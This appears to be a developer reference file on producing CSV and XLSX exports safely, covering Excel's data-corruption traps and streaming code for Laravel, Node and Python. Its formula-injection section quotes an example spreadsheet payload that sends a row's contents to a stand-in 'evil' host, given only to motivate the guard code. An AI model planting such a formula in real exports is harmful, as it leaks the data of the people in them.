# Spreadsheet exports — CSV and XLSX

Read when producing any CSV or XLSX, or when data is going to be opened in Excel. The format
decision, authorisation and streaming rules are in [SKILL.md](./SKILL.md); this file is the traps
and the code.

## CSV or XLSX

**CSV** unless you need something XLSX alone gives: more than one sheet, formulas, per-cell number
or date formatting, frozen header rows, column widths, cell styling, or a data-validation list.
CSV streams row by row at constant memory, opens in everything, and cannot corrupt. XLSX is a zip of
XML: it buys formatting and costs memory, CPU, and a library.

A request for "an Excel file" is usually a request for the data. Ask what they do with it next: if
the answer is "pivot it" or "import it", CSV is the better answer and finishes sooner.

## The five ways Excel corrupts correct data

These are not edge cases. Every one of them will hit a Philippine dataset in the first week.

1. **Leading zeros vanish.** A TIN, a phone number `09171234567`, a barangay or precinct code, an
   employee number `0042` — Excel reads them as numbers and eats the zero. Write the column as
   **text**, and in CSV do not rely on quoting alone (Excel ignores it for this): either write XLSX
   with an explicit text format, or prefix with a tab/`="..."` if the recipient's workflow tolerates it.
2. **Long digit strings become scientific notation.** Anything over 15 digits — a reference number,
   a PhilSys number — becomes `9.17123E+11`, and the original digits are **gone**, not hidden. Same
   fix: the column is text, not a number.
3. **`ñ` and `é` turn into mojibake.** Excel does not detect UTF-8 in CSV. Write a **UTF-8 BOM**
   (`\xEF\xBB\xBF`) as the first bytes. Peña, Muñoz and Ñuñez are normal Filipino names; this is not
   an internationalisation nicety.
4. **Dates get reinterpreted.** `03/04/2026` is March 4 or April 3 depending on the machine's
   locale. Write ISO `2026-04-03` as text, or a real date cell in XLSX with an explicit format —
   never an ambiguous locale-dependent string.
5. **Formula injection — a security bug, not a formatting one.** A cell whose value starts with
   `=`, `+`, `-`, `@`, or a tab/CR is executed by Excel and LibreOffice when opened. User-supplied
   text (a customer name, a remark field) reaches your export unfiltered, and
   `=HYPERLINK("http://evil/?"&A1,"Click")` exfiltrates the row. **Prefix any cell value beginning
   with one of those characters with a single quote `'`, or strip the character.** Do this for every
   string cell that came from user input, in every export.

## Streaming, per stack

The pattern is identical everywhere: never materialise the full result set.

```php
// Laravel — chunked query, queued job. maatwebsite/excel
class SalesExport implements FromQuery, WithHeadings, WithMapping, ShouldQueue
{
    use Exportable;
    public function __construct(private int $branchId, private Carbon $from, private Carbon $to) {}

    public function query() {                       // NOT ->get(): the package chunks this
        return Sale::query()
            ->where('branch_id', $this->branchId)   // resolved from the session, never from input
            ->whereBetween('sold_at', [$this->from, $this->to]);
    }
    public function headings(): array { return ['Date', 'OR No.', 'Customer', 'Total (PHP)']; }
    public function map($sale): array {
        return [
            $sale->sold_at->setTimezone('Asia/Manila')->format('Y-m-d H:i'),
            (string) $sale->or_number,               // text: keeps leading zeros
            self::safe($sale->customer_name),        // formula injection guard
            number_format($sale->total_centavos / 100, 2, '.', ''),
        ];
    }
    private static function safe(?string $v): string {
        return $v !== null && preg_match('/^[=+\-@\t\r]/', $v) ? "'".$v : (string) $v;
    }
}
// dispatch: (new SalesExport(...))->queue('exports/sales-2026-09.xlsx', 'local');
```

```ts
// Node — CSV streamed straight to the response, constant memory
const SAFE = (v: unknown) => {
  const s = String(v ?? "");
  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
};
const cell = (v: unknown) => `"${SAFE(v).replace(/"/g, '""')}"`;

res.setHeader("Content-Type", "text/csv; charset=utf-8");
res.setHeader("Content-Disposition",
  `attachment; filename="sales-${from}_${to}-branch-${branch.slug}.csv"`);
res.write("﻿");                                  // BOM, or Excel mangles ñ
res.write("Date,OR No.,Customer,Total (PHP)\n");
for await (const row of db.stream(salesQuery)) {      // cursor, not .all()
  res.write([
    row.soldAt.toISOString().slice(0, 16).replace("T", " "),
    cell(row.orNumber), cell(row.customerName),
    (row.totalCentavos / 100).toFixed(2),
  ].join(",") + "\n");
}
res.end();
```

```python
# Python — openpyxl write_only keeps one row in memory at a time
from openpyxl import Workbook
from openpyxl.cell import WriteOnlyCell

wb = Workbook(write_only=True); ws = wb.create_sheet("Sales")
ws.append(["Date", "OR No.", "Customer", "Total (PHP)"])
for row in stream_sales(branch_id, start, end):        # a generator over a server-side cursor
    or_no = WriteOnlyCell(ws, value=str(row.or_number))
    or_no.number_format = "@"                          # text: keeps leading zeros
    ws.append([row.sold_at.astimezone(MANILA).strftime("%Y-%m-%d %H:%M"),
               or_no, safe(row.customer_name), row.total_centavos / 100])
wb.save(path)
```

## Headers and totals

- One header row, human words, units in the header (`Total (PHP)`), not repeated per cell.
- Put the report's scope in the first rows or the sheet name: period, branch, timezone, generated-at,
  and who generated it. A spreadsheet with no provenance gets forwarded and misread.
- A totals row belongs at the **bottom** and must be computed from the same data as the rows, in
  integer minor units. In XLSX prefer a real `=SUM()` over a baked number so the recipient can
  filter without the total lying.

## Done

- Opened in Excel (or Sheets) and checked: `ñ` intact, leading zeros intact, dates unambiguous, no
  cell rendered as scientific notation.
- Every user-supplied string cell passes through the formula-injection guard.
- Ran at a realistic row count, not a demo one, and memory stayed flat.
